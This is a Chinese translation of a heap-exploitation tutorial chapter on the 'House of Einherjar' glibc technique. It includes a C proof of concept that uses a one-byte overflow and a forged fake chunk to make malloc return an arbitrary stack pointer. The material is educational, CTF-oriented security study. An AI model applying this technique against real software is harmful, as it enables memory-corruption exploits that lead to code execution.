---
title: Heap Exploitation系列翻译-16 House of Einherjar
tags: [CTF, pwn, heap]
layout: post
categories: translations
---
# House of Einherjar

> 本文是对Dhaval Kapil的[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)系列教程的译文

这个house并不是"The Malloc Maleficarum"的一部分. 这项堆漏洞技术是由[Hiroki Matsukuma](https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606)于2016年提出. 这项攻击也是围绕着利用'malloc'来返回一个附近的任意指针. 和其他攻击不同, 它只要求1字节的溢出即可实现. 有许多1字节溢出的软件漏洞, 但大多是著名的["off by one"](https://en.wikipedia.org/wiki/Off-by-one_error)错误. 它覆写内存中next chunk的'size并清除了`PREV_IN_USE`标志为零, 当然也会向`prev_size`(已经在前一个堆块的数据域)覆写一个伪造的大小. 当next chunk被释放, 它会发现它前一个堆块是空闲状态并尝试通过内存中'我们之前伪造的大小'作偏移来合并堆块. 伪造大小是精心计算的因此合并后的堆块的范围在伪造堆块处截止, 这可以被后续的malloc所返回

考虑以下示例代码(下载完整版本 [这里](https://heap-exploitation.dhavalkapil.com/assets/files/house_of_einherjar.c)):

```c
struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[32];               // padding
};

struct chunk_structure *chunk1, fake_chunk;     // fake chunk is at 0x7ffee6b64e90
size_t allotedSize;
unsigned long long *ptr1, *ptr2;
char *ptr;
void *victim;

// Allocate any chunk
// The attacker will overflow 1 byte through this chunk into the next one
ptr1 = malloc(40);                              // at 0x1dbb010

// Allocate another chunk
ptr2 = malloc(0xf8);                            // at 0x1dbb040

chunk1 = (struct chunk_structure *)(ptr1 - 2);
allotedSize = chunk1->size & ~(0x1 | 0x2 | 0x4);
allotedSize -= sizeof(size_t);      // Heap meta data for 'prev_size' of chunk1

// Attacker initiates a heap overflow
// Off by one overflow of ptr1, overflows into ptr2's 'size'
ptr = (char *)ptr1;
ptr[allotedSize] = 0;      // Zeroes out the PREV_IN_USE bit

// Fake chunk
fake_chunk.size = 0x100;   // enough size to service the malloc request
// These two will ensure that unlink security checks pass
// i.e. P->fd->bk == P and P->bk->fd == P
fake_chunk.fd = &fake_chunk;
fake_chunk.bk = &fake_chunk;

// Overwrite ptr2's prev_size so that ptr2's chunk - prev_size points to our fake chunk
// This falls within the bounds of ptr1's chunk - no need to overflow
*(size_t *)&ptr[allotedSize-sizeof(size_t)] =
                                (size_t)&ptr[allotedSize - sizeof(size_t)]  // ptr2's chunk
                                - (size_t)&fake_chunk;

// Free the second chunk. It will detect the previous chunk in memory as free and try
// to merge with it. Now, top chunk will point to fake_chunk
free(ptr2);

victim = malloc(40);                  // Returns address 0x7ffee6b64ea0 !!
```

注意以下事项:

1. 第二个堆块的大小为`0xf8`, 这只是确保了堆块的真实大小的最低有效字节为`0`(忽视标志位). 因此, 我们可以轻松的在不改变堆块大小的情况下设置`prev_in_use`位为`0`.
2. `allotedSize`减去了`sizeof(size_t)`, `allotedSize`等于完整堆块的大小. 这是因为当前堆块的`size`和`prev_size`不可用, 但是next chunk的`prev_size`可用.
3. 伪堆块的前向后向指针都经过调整, 以通过`unlink`的安全检查.
